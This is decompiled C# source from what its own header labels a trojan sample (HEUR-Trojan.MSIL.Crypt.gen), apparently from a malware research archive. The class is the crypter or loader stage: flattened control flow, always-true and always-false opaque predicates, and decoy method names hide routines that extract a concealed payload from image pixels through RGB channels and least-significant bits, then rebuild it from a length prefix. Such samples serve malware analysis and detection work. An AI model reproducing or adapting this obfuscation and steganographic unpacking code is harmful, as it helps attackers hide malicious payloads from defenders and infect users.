// Decompiled with JetBrains decompiler
// Type: func
// Assembly: wacYTAgLgQAjexermaa, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B2A0664-5AE5-48FF-9B05-FC8D65B8BF2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-31211fd1239d9e0de50a1af9ad1e71a55be0dac1e55e06444d2537caa96bd0c6.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public class func
{
  [MethodImpl(MethodImplOptions.NoInlining)]
  public static Image EnumWindowsOnEnableget_AvatarFull(byte[] bytes)
  {
    MemoryStream memoryStream = new MemoryStream(bytes);
    try
    {
      return (Image) func.getCommandIdentityGetGroupsget_Plugins((object) memoryStream);
    }
    finally
    {
      if (memoryStream != null)
        func.SaveExecuteset_Directory((object) memoryStream);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static byte[] ExecuteInitializeget_AvatarMedium(Image innocuousImg)
  {
    int num1 = 8;
    int num2;
    Bitmap bitmap;
    int num3;
    int num4;
    Color permissionsgetGroupsReload;
    byte[] numArray;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 9:
          if (num2 >= func.RunAsync_Logger_DoWorkremove_OnPluginLoading((object) bitmap))
          {
            int num5 = 15;
            num1 = func.ParseBoolLoadAssembliesFromDirectoryGetPermissions() ? num5 : num5;
            continue;
          }
          num4 = 0;
          num1 = 11;
          continue;
        case 1:
        case 13:
          num3 = 0;
          goto case 2;
        case 2:
        case 14:
          numArray = new byte[3 * func.get_Configurationadd_OnExecuteCommandSaveGroup((object) bitmap) * func.RunAsync_Logger_DoWorkremove_OnPluginLoading((object) bitmap)];
          num1 = 12;
          continue;
        case 3:
        case 11:
          if (num4 < func.get_Configurationadd_OnExecuteCommandSaveGroup((object) bitmap))
          {
            permissionsgetGroupsReload = func.GetPermissionsget_GroupsReload((object) bitmap, num4, num2);
            num1 = 6;
            continue;
          }
          if (func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread())
          {
            num1 = 4;
            continue;
          }
          goto case 5;
        case 4:
          ++num2;
          if (func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread())
          {
            num1 = 9;
            continue;
          }
          goto case 8;
        case 5:
          numArray[num3++] = permissionsgetGroupsReload.B;
          num1 = 7;
          continue;
        case 6:
          numArray[num3++] = permissionsgetGroupsReload.R;
          goto case 10;
        case 7:
          ++num4;
          num1 = 3;
          continue;
        case 8:
          bitmap = new Bitmap(innocuousImg);
          func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread();
          if (func.ParseBoolLoadAssembliesFromDirectoryGetPermissions())
          {
            int num6 = 14;
            num1 = func.ParseBoolLoadAssembliesFromDirectoryGetPermissions() ? num6 : num6;
            continue;
          }
          if (true)
          {
            num1 = 13;
            continue;
          }
          goto case 10;
        case 10:
          numArray[num3++] = permissionsgetGroupsReload.G;
          num1 = 5;
          continue;
        case 12:
          num2 = 0;
          num1 = 0;
          continue;
        case 15:
          goto label_20;
        default:
          num1 = 10;
          continue;
      }
    }
label_20:
    return numArray;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static Bitmap get_AvatarFullget_Nameset_AvatarFull(
    byte[] rgbComponents,
    int width,
    int hight)
  {
    func.ParseBoolLoadAssembliesFromDirectoryGetPermissions();
    int num1 = !func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread() ? 10 : 6;
    int num2;
    int num3;
    Bitmap namesetAvatarFull;
    Queue<byte> byteQueue;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 6:
          byteQueue = new Queue<byte>((IEnumerable<byte>) rgbComponents);
          if (true)
          {
            num1 = 7;
            continue;
          }
          goto case 1;
        case 1:
        case 2:
          if (num3 >= width)
          {
            num1 = 9;
            continue;
          }
          func.Broadcastset_Assemblyget_MostPlayedGames((object) namesetAvatarFull, num3, num2, func.HasPermissionget_PermissionsIsValidCSteamID((int) byteQueue.Dequeue(), (int) byteQueue.Dequeue(), (int) byteQueue.Dequeue()));
          goto case 5;
        case 3:
        case 8:
        case 10:
          if (num2 >= hight)
          {
            if (true)
            {
              num1 = 11;
              continue;
            }
            goto case 1;
          }
          else
          {
            num3 = 0;
            num1 = 2;
            continue;
          }
        case 4:
          num2 = 0;
          goto case 3;
        case 5:
          ++num3;
          num1 = 1;
          continue;
        case 7:
          namesetAvatarFull = new Bitmap(width, hight);
          if (true)
          {
            num1 = 4;
            continue;
          }
          goto case 5;
        case 9:
          ++num2;
          num1 = 8;
          continue;
        case 11:
          goto label_15;
        default:
          num1 = 5;
          continue;
      }
    }
label_15:
    return namesetAvatarFull;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static byte[] get_MostPlayedGamesInitializeget_Permissions(Bitmap b)
  {
    int num1 = 3;
    byte[] numArray;
    byte[] initializegetPermissions;
    int num2;
    Color permissionsgetGroupsReload;
    int num3;
    int num4;
    int commandSaveGroup;
    while (true)
    {
      switch (num1)
      {
        case 0:
          num3 += 4;
          goto case 1;
        case 1:
          ++num4;
          num1 = 2;
          continue;
        case 2:
        case 5:
        case 7:
          if (num4 < commandSaveGroup)
          {
            permissionsgetGroupsReload = func.GetPermissionsget_GroupsReload((object) b, num2, num4);
            if (true)
            {
              num1 = 15;
              continue;
            }
            goto case 13;
          }
          else
          {
            if (func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread())
            {
              num1 = 6;
              continue;
            }
            goto case 14;
          }
        case 3:
          commandSaveGroup = func.get_Configurationadd_OnExecuteCommandSaveGroup((object) b);
          num1 = 8;
          continue;
        case 4:
        case 10:
        case 11:
          if (num2 < commandSaveGroup)
          {
            num4 = 0;
            goto case 2;
          }
          else
          {
            num1 = 14;
            continue;
          }
        case 6:
          ++num2;
          num1 = 10;
          continue;
        case 8:
          numArray = new byte[commandSaveGroup * commandSaveGroup * 4];
          if (func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread())
          {
            num1 = 13;
            continue;
          }
          goto case 2;
        case 9:
          num2 = 0;
          func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread();
          if (!func.ParseBoolLoadAssembliesFromDirectoryGetPermissions())
          {
            if (true)
            {
              num1 = 11;
              continue;
            }
            goto case 2;
          }
          else
          {
            num1 = 7;
            continue;
          }
        case 12:
          func.FixedUpdategetCommandTypeget_Name((object) numArray, 4, (object) initializegetPermissions, 0, initializegetPermissions.Length);
          num1 = 16;
          continue;
        case 13:
          num3 = 0;
          num1 = 9;
          continue;
        case 14:
          initializegetPermissions = new byte[func.OnDestroyset_IsLimitedAccountGetPlugin((object) numArray, 0)];
          if (!func.ParseBoolLoadAssembliesFromDirectoryGetPermissions())
          {
            num1 = 12;
            continue;
          }
          goto label_22;
        case 15:
          func.FixedUpdategetCommandTypeget_Name(func.get_Locationget_PermissionsGetShellWindow(permissionsgetGroupsReload.ToArgb()), 0, (object) numArray, num3, 4);
          num1 = 0;
          continue;
        case 16:
          goto label_22;
        default:
          if (true)
          {
            num1 = 1;
            continue;
          }
          goto case 4;
      }
    }
label_22:
    return initializegetPermissions;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static byte[] set_SummaryOnDisableGetPermissions(Image imageFileName)
  {
    object permissions = func.set_CustomURLget_AllowedCallerGetPermissions((object) imageFileName);
    return (byte[]) func.get_HoursPlayedLastTwoWeeksLogWarningExecute(permissions, 4, func.OnDestroyset_IsLimitedAccountGetPlugin(func.get_HoursPlayedLastTwoWeeksLogWarningExecute(permissions, 0, 4), 0));
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static byte[] get_State\u003CLoadPlugin\u003Eb__4_0set_Groups(
    object innocuousLookingData,
    int byteIndex,
    int byteCount)
  {
    int num1 = 9;
    byte[] pluginB40setGroups;
    while (true)
    {
      int num2;
      int index;
      int length;
      bool[] values;
      switch (num1)
      {
        case 0:
          index = 0;
          num1 = 3;
          continue;
        case 1:
        case 2:
          num2 = byteIndex * 8;
          num1 = 7;
          continue;
        case 3:
        case 8:
          if (index >= length)
          {
            num1 = 6;
            continue;
          }
          values[index] = (int) (byte) innocuousLookingData[index + num2] % 2 == 1;
          break;
        case 6:
          BitArray bitArray = new BitArray(values);
          pluginB40setGroups = new byte[func.set_CustomURLDeleteGroupUnload((object) bitArray) / 8];
          func._invokeget_MostPlayedGamesset_Commands((object) bitArray, (object) pluginB40setGroups, 0);
          num1 = 10;
          continue;
        case 7:
          values = new bool[length];
          num1 = 0;
          continue;
        case 9:
          length = byteCount * 8;
          func.ParseBoolLoadAssembliesFromDirectoryGetPermissions();
          if (func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread())
          {
            num1 = 2;
            continue;
          }
          if (func.set_AvatarIconDeregisterFromAssemblyQueueOnMainThread())
          {
            num1 = 4;
            continue;
          }
          goto case 7;
        case 10:
          goto label_13;
      }
      ++index;
      num1 = 8;
    }
label_13:
    return pluginB40setGroups;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public func() => func.TryAddComponentHasPermissionGetParentGroups((object) this);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object getCommandIdentityGetGroupsget_Plugins([In] object obj0) => (object) Image.FromStream((Stream) obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void SaveExecuteset_Directory([In] object obj0) => ((IDisposable) obj0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool set_AvatarIconDeregisterFromAssemblyQueueOnMainThread() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool ParseBoolLoadAssembliesFromDirectoryGetPermissions() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int get_Configurationadd_OnExecuteCommandSaveGroup([In] object obj0) => ((Image) obj0).Width;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int RunAsync_Logger_DoWorkremove_OnPluginLoading([In] object obj0) => ((Image) obj0).Height;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static Color GetPermissionsget_GroupsReload([In] object obj0, [In] int obj1, [In] int obj2) => ((Bitmap) obj0).GetPixel(obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static Color HasPermissionget_PermissionsIsValidCSteamID(
    [In] int obj0,
    [In] int obj1,
    [In] int obj2)
  {
    return Color.FromArgb(obj0, obj1, obj2);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void Broadcastset_Assemblyget_MostPlayedGames(
    [In] object obj0,
    [In] int obj1,
    [In] int obj2,
    [In] Color obj3)
  {
    ((Bitmap) obj0).SetPixel(obj1, obj2, obj3);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object get_Locationget_PermissionsGetShellWindow([In] int obj0) => (object) BitConverter.GetBytes(obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void FixedUpdategetCommandTypeget_Name(
    [In] object obj0,
    [In] int obj1,
    [In] object obj2,
    [In] int obj3,
    [In] int obj4)
  {
    Buffer.BlockCopy((Array) obj0, obj1, (Array) obj2, obj3, obj4);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int OnDestroyset_IsLimitedAccountGetPlugin([In] object obj0, [In] int obj1) => BitConverter.ToInt32((byte[]) obj0, obj1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object set_CustomURLget_AllowedCallerGetPermissions([In] object obj0) => (object) func.ExecuteInitializeget_AvatarMedium((Image) obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object get_HoursPlayedLastTwoWeeksLogWarningExecute(
    [In] object obj0,
    int byteIndex,
    int byteCount)
  {
    return (object) func.get_State\u003CLoadPlugin\u003Eb__4_0set_Groups(obj0, byteIndex, byteCount);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int set_CustomURLDeleteGroupUnload([In] object obj0) => ((BitArray) obj0).Length;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void _invokeget_MostPlayedGamesset_Commands([In] object obj0, [In] object obj1, [In] int obj2) => ((BitArray) obj0).CopyTo((Array) obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void TryAddComponentHasPermissionGetParentGroups([In] object obj0) => obj0.\u002Ector();
}
